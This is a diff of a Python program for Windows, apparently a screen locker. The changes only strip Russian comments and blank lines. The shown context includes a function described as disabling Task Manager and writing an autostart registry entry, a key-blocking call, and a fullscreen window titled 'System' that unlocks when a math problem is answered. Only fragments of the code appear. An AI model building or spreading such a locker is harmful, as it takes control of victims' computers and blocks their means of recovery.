@@ -1,4 +1,3 @@
-# Стандартные библиотеки
 import ctypes
 import getpass
 import os
@@ -7,16 +6,11 @@ import socket
 import sys
 import winreg
 from multiprocessing import Process
-
-# Сторонние библиотеки
 import keyboard
 import psutil
 import tkinter as tk
 from playsound import playsound
-
-# Константы цветов
 RED, GREEN, ORANGE, GREY, BLACK = "#ff0000", "#00ff00", "#ffa500", "#808080", "#0a0a0a"
-
 # -------------------------------- Системные функции -------------------------------- #
 def set_registry_settings(disable=True):
     """Отключает/включает Диспетчер задач и управляет записью в автозагрузке Windows."""
@@ -111,7 +105,6 @@ def generate_math_problem():
     op = random.choice(['+', '-'])
     current_answer = str(eval(f"{a}{op}{b}"))
     return f"Решите: {a} {op} {b} = ?"
-
 # -------------------------------- Интерфейс -------------------------------- #
 def window():
     """Создает и настраивает главное графическое окно блокировщика."""
@@ -121,7 +114,6 @@ def window():
     set_registry_settings(True)
     block_keys()
 
-    
     root = tk.Tk()
     root.title("System")
     root.attributes('-fullscreen', True)
